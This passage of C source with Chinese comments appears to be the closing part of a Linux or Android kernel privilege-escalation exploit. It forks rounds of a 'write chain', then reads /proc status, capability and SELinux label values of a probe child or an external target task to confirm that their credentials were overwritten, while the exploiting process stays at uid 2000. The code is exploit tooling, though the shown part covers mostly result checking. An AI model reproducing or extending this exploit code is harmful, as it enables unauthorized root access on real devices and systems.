            signal(SIGHUP, SIG_IGN);
            signal(SIGINT, SIG_IGN);
            signal(SIGTERM, SIG_IGN);
            signal(SIGPIPE, SIG_IGN);
            /* g_rth 在子进程里无效(线程不继承), 绝对不能 join; 只关继承来的 fd */
            for (int i = 0; i < g_nfd; i++) close(g_fd[i]);
            g_nfd = 0;
            goto round_begin;
        }
        if (nx < 0) { printf("[-] fork 下一轮失败 errno=%d\n", errno); }
        _exit(0);                      /* 父进程退出 */
    }
    printf("[B19] 写链结束(%d 轮) —— 最终身份:\n",
           g_noff ? g_noff : (g_nop ? g_nop : 1));
    if (g_nop && !g_leak_tid) {
        /* 指针写的目标是我们 fork 出来的 probe 子进程(uid=2000)。
         * worker 自身没动过 cred, 所以权威回读必须读 probe 的 /proc。 */
        char p[64], b[2048];
        int tgtp = g_probe_pid;
        snprintf(p, sizeof p, "/proc/%d/status", tgtp);
        int fd = open(p, O_RDONLY);
        int n = fd >= 0 ? read(fd, b, sizeof b - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) {
            b[n] = 0;
            const char *keys[] = { "Uid:", "Gid:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:" };
            for (int k = 0; k < 6; k++) {
                char *q = strstr(b, keys[k]);
                if (!q) continue;
                char *nl = strchr(q, '\n');
                if (nl) *nl = 0;
                printf("[B19p] probe %d  %s\n", tgtp, q);
            }
            char sb[128] = { 0 };
            snprintf(p, sizeof p, "/proc/%d/attr/current", tgtp);
            fd = open(p, O_RDONLY);
            n = fd >= 0 ? (int)read(fd, sb, sizeof sb - 1) : -1;
            if (fd >= 0) close(fd);
            if (n > 0) { sb[n] = 0; char *nl = strchr(sb, '\n'); if (nl) *nl = 0; }
            printf("[B19p] probe %d  attr/current='%s'\n", tgtp, n > 0 ? sb : "?");
        } else {
            printf("[B19p] 读 /proc/%d/status 失败 errno=%d\n", tgtp, errno);
        }
        fflush(stdout);
    }
    if (g_leak_tid) {
        /* 外部靶: 本进程永远是 uid=2000, 真正被改的是靶 task。直接读 /proc/<tid>/status
         * 的 Uid/Gid 四元组 (real effective saved fs) 作为权威回读。 */
        char p[64], b[2048];
        snprintf(p, sizeof p, "/proc/%d/status", (int)g_leak_tid);
        int fd = open(p, O_RDONLY);
        int n = fd >= 0 ? read(fd, b, sizeof b - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) {
            b[n] = 0;
            char *u = strstr(b, "\nUid:");
            char *g = strstr(b, "\nGid:");
            printf("[B19b] 靶 task %d status: Uid:%s Gid:%s",
                   (int)g_leak_tid,
                   u ? strchr(u, '\t') : "?",
                   g ? strchr(g, '\t') : "?");
            /* -P 指针写需要额外确认权限位: CapEff 与 SELinux 标签 */
            char *ce = strstr(b, "\nCapEff:");
            if (ce) printf("[B19b2] 靶 CapEff:%s", strchr(ce, '\t'));
            snprintf(p, sizeof p, "/proc/%d/attr/current", (int)g_leak_tid);
            char sb[128] = { 0 };
            fd = open(p, O_RDONLY);
            n = fd >= 0 ? (int)read(fd, sb, sizeof sb - 1) : -1;
            if (fd >= 0) close(fd);
            if (n > 0) { sb[n] = 0; char *nl = strchr(sb, '\n'); if (nl) *nl = 0; }
            printf("[B19b3] 靶 attr/current = '%s'\n", n > 0 ? sb : "?");
        } else {
            printf("[B19b] 读 /proc/%d/status 失败 errno=%d\n", (int)g_leak_tid, errno);
        }
        fflush(stdout);
        printf("[B19c] 洁净进程自身 uid=%d gid=%d (未改), 靶进程静止存活\n",
               (int)getuid(), (int)getgid());
        fflush(stdout);
        sm("[SM] 写链完成, 靶 %d 状态已回读", (int)g_leak_tid);
        reap_all_children("[B19d]");
        return 0;
    }
    {
        uid_t ru, eu, su; gid_t rg, eg, sg;
        getresuid(&ru, &eu, &su);
        getresgid(&rg, &eg, &sg);
        printf("[B19b] ruid=%d euid=%d suid=%d | rgid=%d egid=%d sgid=%d\n",
               (int)ru, (int)eu, (int)su, (int)rg, (int)eg, (int)sg);
    }
    if (g_cchild) { reap_all_children("[C1c]"); _exit(0); }
    printf("[B20] keep alive 5s\n");
    sleep(5);
    return 0;
}
